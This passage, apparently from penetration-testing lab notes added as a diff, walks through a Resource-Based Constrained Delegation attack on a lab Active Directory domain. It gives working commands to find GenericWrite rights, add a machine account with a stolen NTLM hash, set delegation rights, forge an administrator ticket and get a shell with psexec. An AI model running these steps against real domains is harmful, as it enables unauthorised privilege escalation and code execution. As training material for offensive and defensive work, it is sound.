+Once RBCD has been configured, the frontend service can use S4U2Self to request the forwardable TGS for any user to itself, followed by S4U2Proxy to create a TGS for that user to the backend service. Unlike constrained delegation, under RBCD, the KDC checks if the SID of the frontend service is present in the **msDS-AllowedToActOnBehalfOfOtherIdentity** property of the backend service.
+
+The frontend service must have an SPN set in the domain. A user account typically does not have an SPN set but all **computer accounts** do. => any attack against RBCD needs to happen from a computer account or a service account with an SPN.
+
+=> Compromise a frontend service that has its SID configured in the **msDS-AllowedToActOnBehalfOfOtherIdentity** property of a backend service.
+
+Find a user account that has write permissions to a machine account, which allows it to modify the **msDS-AllowedToActOnBehalfOfOtherIdentity** property. This can be object permissions such as **GenericAll, GenericWrite, WriteDacl, WriteProperty**, etc.
+
+Log in to the CLIENT01 machine with the adam user.
+
+Enumerating GenericWrite permissions on computer objects
+
+```pwsh
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+```
+
+```
+AceType               : AccessAllowed
+ObjectDN              : CN=BACKUP01,OU=CorpComputers,DC=corp,DC=com
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+ObjectSID             : S-1-5-21-3515682028-2106700410-3524882512-6101
+InheritanceFlags      : None
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3515682028-2106700410-3524882512-1602
+AccessMask            : 131132
+AuditFlags            : None
+AceFlags              : None
+AceQualifier          : AccessAllowed
+Identity              : CORP\mary
+```
+
+=> mary user has GenericWrite on BACKUP01.
+
+=> mary can update any non-protected property on the machine, including the **msDS-AllowedToActOnBehalfOfOtherIdentity**, and add the **SID of a different computer**.
+
+Once a SID is added, we can act in the context of that computer account and obtain a TGS for BACKUP01.
+
+We either have to obtain the password hash of a computer account or create a new computer object with a password of our choosing.
+
+By default, any authenticated user can add up to 10 computer accounts to the domain and they will have SPNs set automatically. This value is present in the **ms-DS-MachineAccountQuota** property in the Active Directory domain object.
+
+```pwsh
+Get-DomainObject -Identity corp -Properties ms-DS-MachineAccountQuota
+```
+
+Normally, the computer account object is created when a physical computer is joined to the domain. However, we can create the object itself with the `impacket-addcomputer` command directly from Kali, using either the clear text password or NTLM hash of a domain user.
+
+If performing the attack from Windows, we can use the `New-MachineAccount` method of the `Powermad.ps` PowerShell script to avoid possible issues with DNS.
+
+Simulate that we've dumped the NTLM hash for the mary user and use it to create a new computer called **myComputer** with the password h4x.
+
+```bash
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+```
+
+Since mary has GenericWrite on the BACKUP01 computer object, edit the **msDS-AllowedToActOnBehalfOfOtherIdentity** on it.
+
+The property stores the SID as a part of a security descriptor and it does this in a **binary format**.
+
+- Iff attack from Windows, obtain the computer SID for myComputer, convert it into a byte array to match the format for the **msDS-AllowedToActOnBehalfOfOtherIdentity**, and then use `Set-DomainObject` to inject it.
+
+- Use the `impacket-rbcd` tool
+
+Adding delegation permissions to BACKUP01
+
+```bash
+impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+```
+
+myComputer$ can now impersonate users on BACKUP01$ via S4U2Proxy.
+
+Use the CIFS SPN and impersonate the administrator user by sending the request with our own myComputer object.
+
+```bash
+impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
+```
+
+With the `administrator.ccache` ticket stored in Kali, add it to the **KRB5CCNAME** variable
+
+```bash
+export KRB5CCNAME=administrator@cifs_backup01.corp.com@CORP.COM.ccache
+```
+
+Use our CIFS access to obtain code execution on BACKUP01, i.e. perform a **network login** instead of an interactive login. => our access will be limited to BACKUP01 and cannot directly be used to expand access toward the rest of the domain.
+
+```bash
+impacket-psexec administrator@backup01.corp.com -k -no-pass
 ```
